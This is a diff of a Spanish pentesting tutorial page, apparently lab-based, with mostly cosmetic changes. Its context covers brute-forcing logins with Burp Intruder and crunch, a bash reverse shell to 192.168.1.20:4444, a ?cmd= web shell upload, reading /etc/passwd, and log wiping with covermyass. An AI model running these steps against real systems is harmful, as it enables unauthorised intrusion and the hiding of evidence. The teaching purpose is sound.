@@ -440,7 +440,6 @@ body.book #toc,body.book #preamble,body.book h1.sect0,body.book .sect1>h2{page-b
 <h1>Ira</h1>
 <div class="details">
 <span id="author" class="author">Manuel L. Quero</span><br>
-<span id="revdate">2025-04-17</span>
 </div>
 <div id="toc" class="toc2">
 <div id="toctitle">Table of Contents</div>
@@ -600,16 +599,16 @@ body.book #toc,body.book #preamble,body.book h1.sect0,body.book .sect1>h2{page-b
 <div class="olist arabic">
 <ol class="arabic">
 <li>
-<p>Sniper &#8594; Este modo prueba una lista de payloads en cada posición de forma individual, manteniendo las demás constantes. Es útil para detectar vulnerabilidades como inyecciones SQL o XSS en parámetros específicos. Por ejemplo, si tienes tres parámetros y una lista de 100 payloads, se realizarán 300 solicitudes (100 por cada parámetro).</p>
+<p><strong>Sniper</strong> &#8594; Este modo prueba una lista de payloads en cada posición de forma individual, manteniendo las demás constantes. Es útil para detectar vulnerabilidades como inyecciones SQL o XSS en parámetros específicos. Por ejemplo, si tienes tres parámetros y una lista de 100 payloads, se realizarán 300 solicitudes (100 por cada parámetro).</p>
 </li>
 <li>
-<p>Battering Ram &#8594; En este se aplica el mismo payload en todas las posiciones marcadas simultáneamente. Sirve para cuando el mismo valor debe estar presente en múltiples campos, como un token que aparece en varios lugares. Por ejemplo, si marcas dos posiciones y tienes una lista de 50 payloads, se realizarán 50 solicitudes, cada una con el mismo payload en ambas posiciones.​</p>
+<p><strong>Battering Ram</strong> &#8594; En este se aplica el mismo payload en todas las posiciones marcadas simultáneamente. Sirve para cuando el mismo valor debe estar presente en múltiples campos, como un token que aparece en varios lugares. Por ejemplo, si marcas dos posiciones y tienes una lista de 50 payloads, se realizarán 50 solicitudes, cada una con el mismo payload en ambas posiciones.​</p>
 </li>
 <li>
-<p>Pitchfork &#8594; Este utiliza diferentes listas de payloads para cada posición, insertando los payloads correspondientes en paralelo. Se utiliza cuando se necesita probar combinaciones específicas de valores relacionados, como pares de usuario y contraseña correspondientes. Por ejemplo, si tienes dos listas de 100 elementos cada una, se realizarán 100 solicitudes, combinando el primer elemento de cada lista, luego el segundo, y así sucesivamente.</p>
+<p><strong>Pitchfork</strong> &#8594; Este utiliza diferentes listas de payloads para cada posición, insertando los payloads correspondientes en paralelo. Se utiliza cuando se necesita probar combinaciones específicas de valores relacionados, como pares de usuario y contraseña correspondientes. Por ejemplo, si tienes dos listas de 100 elementos cada una, se realizarán 100 solicitudes, combinando el primer elemento de cada lista, luego el segundo, y así sucesivamente.</p>
 </li>
 <li>
-<p>Cluster Bomb &#8594; Genera todas las combinaciones posibles entre múltiples listas de payloads, prueba cada combinación en las posiciones correspondientes. Es ideal para ataques de fuerza bruta donde se desconoce la relación entre los valores, como probar todas las combinaciones posibles de usuarios y contraseñas. Por ejemplo, si tienes una lista de 100 usuarios y otra de 100 contraseñas, se realizarán 10,000 solicitudes (100 x 100).</p>
+<p><strong>Cluster Bomb</strong> &#8594; Genera todas las combinaciones posibles entre múltiples listas de payloads, prueba cada combinación en las posiciones correspondientes. Es ideal para ataques de fuerza bruta donde se desconoce la relación entre los valores, como probar todas las combinaciones posibles de usuarios y contraseñas. Por ejemplo, si tienes una lista de 100 usuarios y otra de 100 contraseñas, se realizarán 10,000 solicitudes (100 x 100).</p>
 </li>
 </ol>
 </div>
@@ -769,7 +768,7 @@ monkey</code></pre>
 <div class="paragraph">
 <p>Si le damos al F12 podremos inspeccionar la estructura de la página, viendo que en los campos del usuario y contraseña, sus IDs son <strong>user</strong> y <strong>pass</strong>.</p>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/Fuerza%20Bruta/Diccionario/IDs.png" alt="ID">
 </div>
@@ -777,7 +776,7 @@ monkey</code></pre>
 <div class="paragraph">
 <p>Si le damos a Network y enviamos unas credenciales erroneas, veremos que se envían mediante <strong>POST</strong>, además de poder ver la url que será importante para el siguiente comando. Además de conocer el mensaje de error que nos devuelve para poder filtrar, en este caso <strong>"Credenciales incorrectas."</strong>.</p>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/Fuerza%20Bruta/Diccionario/POST.png" alt="POST">
 </div>
@@ -822,7 +821,7 @@ monkey</code></pre>
 </li>
 </ul>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/Fuerza%20Bruta/Diccionario/Ataque.png" alt="Ataque">
 </div>
@@ -830,12 +829,12 @@ monkey</code></pre>
 <div class="paragraph">
 <p>Probamos las credenciales que ha encontrado.</p>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/Fuerza%20Bruta/Diccionario/Cred.png" alt="Credenciales">
 </div>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/Fuerza%20Bruta/Diccionario/Entrar.png" alt="Pasar login">
 </div>
@@ -849,7 +848,7 @@ monkey</code></pre>
 <div class="paragraph">
 <p>Primeramente recomiendo instalar FoxyProxy en nuestro navegador. Cuando estemos dentro de este, deberemos irnos a Proxies y crear uno nuevo dándole a Add. Deberemos poner la siguiente configuración, para interceptar con Burpsuite en local desde el puerto 8081. Además deberemos añadir en la parte de patrones el que aparece en la siguiente imagen:</p>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/Fuerza%20Bruta/Diccionario/Burp/FoxyProxy.png" alt="FoxyProxy Config">
 </div>
@@ -857,7 +856,7 @@ monkey</code></pre>
 <div class="paragraph">
 <p>Nos vamos a nuestra página donde le daremos al logo de FoxyProxy si lo hemos puesto en la barra de herramientas y le damos al proxy que hemos creado.</p>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/Fuerza%20Bruta/Diccionario/Burp/FoxyProxy2.png" alt="FoxyProxy Navegador">
 </div>
@@ -865,7 +864,7 @@ monkey</code></pre>
 <div class="paragraph">
 <p>Ahora abrimos Burpsuite y creamos un proyecto temporal, ya que tendremos la versión de la comunidad, iniciándolo por defecto. Cuando esté abierto, nos vamos a la configuración del proxy donde pondremos la IP y puerto que hemos configurado en FoxyProxy.</p>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/Fuerza%20Bruta/Diccionario/Burp/Burp1.png" alt="Burpsuite">
 </div>
@@ -873,12 +872,12 @@ monkey</code></pre>
 <div class="paragraph">
 <p>En Burpsuite, en la parte de Proxy, le damos a <strong>Intercept off</strong> para pasarlo a <strong>on</strong> y comenzar a capturar el tráfico. Y en nuestra página ponemos cualquier credenciales y le damos a entrar, enviándonos a Burpsuite directamente.</p>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/Fuerza%20Bruta/Diccionario/Burp/Burp2.png" alt="Burpsuite2">
 </div>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/Fuerza%20Bruta/Diccionario/Burp/LoginBurp.png" alt="Enviar petición">
 </div>
@@ -886,12 +885,12 @@ monkey</code></pre>
 <div class="paragraph">
 <p>En Burpsuite, nos aparecerá la petición POST que hemos capturado, donde podremos ver los IDs de los campos, por lo que para atacar desde Burpsuite, deberemos pasar esta petición al intruder, le damos clic derecho sobre la petición y la enviamo a este:</p>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/Fuerza%20Bruta/Diccionario/Burp/Burp3.png" alt="Burpsuite2">
 </div>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/Fuerza%20Bruta/Diccionario/Burp/Intruder1.png" alt="Intruder1">
 </div>
@@ -899,7 +898,7 @@ monkey</code></pre>
 <div class="paragraph">
 <p>Una vez en el Intruder, deberemos darle al desplegable de arriba y cambiarlo a <strong>Cluster bomb attack</strong>, ya que sirve para ataques que combinan usuarios y contraseñas. Después en los IDs que están en la parte inferior, borraremos el usuario y contraseña que hemos puesto antes en el login, y después de cada símbolo de igual le daremos a <strong>Add §</strong>.</p>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/Fuerza%20Bruta/Diccionario/Burp/Intruder2.png" alt="Intruder2">
 </div>
@@ -907,12 +906,12 @@ monkey</code></pre>
 <div class="paragraph">
 <p>A la derecha nos pedirá igresar un payload, es decir, los diccionarios y deberemos poner el correspondiente payload en la posición correcta. En el 1 va el de los usuario y le pongo el diccionario de nombres de usuario frecuentes y en el 2 va la contraseña y por ello le pongo el diccionario de contraseñas sencillas.</p>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/Fuerza%20Bruta/Diccionario/Burp/Intruder3.png" alt="Intruder3">
 </div>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/Fuerza%20Bruta/Diccionario/Burp/Intruder4.png" alt="Intruder4">
 </div>
@@ -927,7 +926,7 @@ monkey</code></pre>
 </li>
 </ul>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/Fuerza%20Bruta/Diccionario/Burp/IntruderRedirections.png" alt="Ajuste Redirecciones">
 </div>
@@ -942,7 +941,7 @@ monkey</code></pre>
 <div class="paragraph">
 <p>Una vez dicho esto le damos al botón naranja para iniciar el ataque, empezará a probar tanto usuarios como contraseñas hasta que dé con el correcto, podemos ver el proceso y cuando cambie la longitud, la primera significa que ha entrado con esas, ya que hemos puesto que acepte redirecciones.</p>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/Fuerza%20Bruta/Diccionario/Burp/Entrar.png" alt="Pasar el login">
 </div>
@@ -950,7 +949,7 @@ monkey</code></pre>
 <div class="paragraph">
 <p>Cuando quitemos la interceptación del proxy, podremos ver cómo hemos entrado:</p>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/Fuerza%20Bruta/Diccionario/Burp/Entrar2.png" alt="Pasar el login2">
 </div>
@@ -1023,7 +1022,7 @@ $ crunch 7 7 user^^^ &gt;&gt; diccionario.txt</code></pre>
 </li>
 </ul>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/Fuerza%20Bruta/Hibrido/Hydra/Ataque.png" alt="Ataque">
 </div>
@@ -1034,7 +1033,7 @@ $ crunch 7 7 user^^^ &gt;&gt; diccionario.txt</code></pre>
 <div class="paragraph">
 <p>En este caso, realizaremos lo ya visto anteriormente hasta la parte del Intruder. En este caso, vamos a usar el Sniper attack, donde se usa en una posicion, un objetivo. Deberemos añadir los símbolos en la parte de la contraseña.</p>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/Fuerza%20Bruta/Hibrido/Burp/Intruder1.png" alt="Intruder1">
 </div>
@@ -1042,7 +1041,7 @@ $ crunch 7 7 user^^^ &gt;&gt; diccionario.txt</code></pre>
 <div class="paragraph">
 <p>En este caso vamos a poner unas cuantas palabras en la parte de payload, añadiendo una por una, y luego añadiremos a cada una distintos sufijos.</p>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/Fuerza%20Bruta/Hibrido/Burp/Intruder2.png" alt="Intruder2">
 </div>
@@ -1050,12 +1049,12 @@ $ crunch 7 7 user^^^ &gt;&gt; diccionario.txt</code></pre>
 <div class="paragraph">
 <p>En la parte de Payload processing, añadiremos los sufijos, para ello le daremos a añadir, en la pestaña buscamos "Add sufix" y ponemos el que queramos, además podemos ponerles incluso prefijos para hacerlo más completo. Pero deberemos activarlos según queramos, ya que si todos están activos se acumulan y eso no lo queremos, por lo que voy a ir uno por uno.</p>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/Fuerza%20Bruta/Hibrido/Burp/Intruder3.png" alt="Intruder3">
 </div>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/Fuerza%20Bruta/Hibrido/Burp/Intruder4.png" alt="Intruder4">
 </div>
@@ -1063,7 +1062,7 @@ $ crunch 7 7 user^^^ &gt;&gt; diccionario.txt</code></pre>
 <div class="paragraph">
 <p>Al final nos debe quedar algo así:</p>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/Fuerza%20Bruta/Hibrido/Burp/Intruder5.png" alt="Intruder5">
 </div>
@@ -1074,12 +1073,12 @@ $ crunch 7 7 user^^^ &gt;&gt; diccionario.txt</code></pre>
 <div class="paragraph">
 <p>Si probamos con el primer sufijo, ninguno es correcto, por lo que queda descartado. De esta forma deberemos probarlo con cada uno.</p>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/Fuerza%20Bruta/Hibrido/Burp/Ataque1.png" alt="Ataque1">
 </div>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/Fuerza%20Bruta/Hibrido/Burp/Ataque2.png" alt="Ataque2">
 </div>
@@ -1108,7 +1107,7 @@ $ crunch 7 7 user^^^ &gt;&gt; diccionario.txt</code></pre>
 </li>
 </ul>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/Fuerza%20Bruta/Inverso/Hydra/Ataque.png" alt="Ataque">
 </div>
@@ -1119,12 +1118,12 @@ $ crunch 7 7 user^^^ &gt;&gt; diccionario.txt</code></pre>
 <div class="paragraph">
 <p>Como ya hemos visto antes, deberemos hacer lo mismo hasta el punto del Intruder, donde añadiremos los símbolos en el usuario y meteremos un payload para adivinarlo.</p>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/Fuerza%20Bruta/Inverso/Burp/Intruder.png" alt="Intruder">
 </div>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/Fuerza%20Bruta/Inverso/Burp/Ataque.png" alt="Ataque">
 </div>
@@ -1145,7 +1144,7 @@ $ crunch 7 7 user^^^ &gt;&gt; diccionario.txt</code></pre>
 <div class="paragraph">
 <p>Teniendo a nuestra disposición una terminal, vamos a recolectar información para luego hacer una reverse shell y poder efectuar comando con mayor tranquilidad.</p>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/RCE/CMD/Página.png" alt="Página">
 </div>
@@ -1159,7 +1158,7 @@ $ crunch 7 7 user^^^ &gt;&gt; diccionario.txt</code></pre>
 </li>
 </ul>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/RCE/CMD/LS.png" alt="comando ls">
 </div>
@@ -1171,7 +1170,7 @@ $ crunch 7 7 user^^^ &gt;&gt; diccionario.txt</code></pre>
 </li>
 </ul>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/RCE/CMD/PWD.png" alt="comando pwd">
 </div>
@@ -1186,7 +1185,7 @@ $ crunch 7 7 user^^^ &gt;&gt; diccionario.txt</code></pre>
 </li>
 </ul>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/RCE/CMD/whoami.png" alt="comando whoami">
 </div>
@@ -1198,7 +1197,7 @@ $ crunch 7 7 user^^^ &gt;&gt; diccionario.txt</code></pre>
 </li>
 </ul>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/RCE/CMD/id.png" alt="comando id">
 </div>
@@ -1210,7 +1209,7 @@ $ crunch 7 7 user^^^ &gt;&gt; diccionario.txt</code></pre>
 </li>
 </ul>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/RCE/CMD/passwd.png" alt="archivo passwd">
 </div>
@@ -1225,7 +1224,7 @@ $ crunch 7 7 user^^^ &gt;&gt; diccionario.txt</code></pre>
 </li>
 </ul>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/RCE/CMD/uname.png" alt="comando uname">
 </div>
@@ -1239,7 +1238,7 @@ $ crunch 7 7 user^^^ &gt;&gt; diccionario.txt</code></pre>
 <div class="paragraph">
 <p>Abrimos una terminal con netcat y nos ponemos a la escucha:</p>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/RCE/CMD/NetCat1.png" alt="NetCat 1">
 </div>
@@ -1252,7 +1251,7 @@ $ crunch 7 7 user^^^ &gt;&gt; diccionario.txt</code></pre>
 <pre class="highlight"><code class="language-bash" data-lang="bash">bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.1.20/4444 0&gt;&amp;1'</code></pre>
 </div>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/RCE/CMD/NetCat2.png" alt="NetCat 2">
 </div>
@@ -1260,7 +1259,7 @@ $ crunch 7 7 user^^^ &gt;&gt; diccionario.txt</code></pre>
 <div class="paragraph">
 <p>Una vez hecho esto ya estaremos conectados con netcat como root:</p>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/RCE/CMD/NetCat3.png" alt="NetCat 3">
 </div>
@@ -1402,7 +1401,7 @@ $ ./covermyass</code></pre>
 <div class="paragraph">
 <p>Ahora nos iremos a la parte de subir archivos, donde primeramente provaremos a subir uno de ejemplo:</p>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/RCE/archivos/Página.png" alt="Página">
 </div>
@@ -1410,17 +1409,17 @@ $ ./covermyass</code></pre>
 <div class="paragraph">
 <p>Voy a subir un archivo pdf para comprobar si se pueden ejecutar los archivos:</p>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/RCE/archivos/PDF1.png" alt="PDF1">
 </div>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/RCE/archivos/PDF2.png" alt="PDF2">
 </div>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/RCE/archivos/PDF3.png" alt="PDF3">
 </div>
@@ -1428,7 +1427,7 @@ $ ./covermyass</code></pre>
 <div class="paragraph">
 <p>Como podemos observar, podemos abrir estos archivos, por lo que vamos a realizar una web shell con permisos de root:</p>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/RCE/archivos/WebShell.png" alt="WebShell">
 </div>
@@ -1436,12 +1435,12 @@ $ ./covermyass</code></pre>
 <div class="paragraph">
 <p>De esta forma, a través de este archivo podremos ejecutar comandos como administrador, deremos usar lo siguiente en la url del archivo "?cmd=(comando)", así enviamos el comando para que el GET lo obtenga y lo pase.</p>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/RCE/archivos/WebShell2.png" alt="WebShell2">
 </div>
 </div>
-<div class="imageblock">
+<div class="imageblock text-center">
 <div class="content">
 <img src="assets/RCE/archivos/WebShell3.png" alt="WebShell3">
 </div>
@@ -1583,7 +1582,7 @@ $ ./covermyass</code></pre>
 </div>
 <div id="footer">
 <div id="footer-text">
-Last updated 2025-04-17 20:22:57 UTC
+Last updated 2025-05-05 17:23:16 UTC
 </div>
 </div>
 </body>
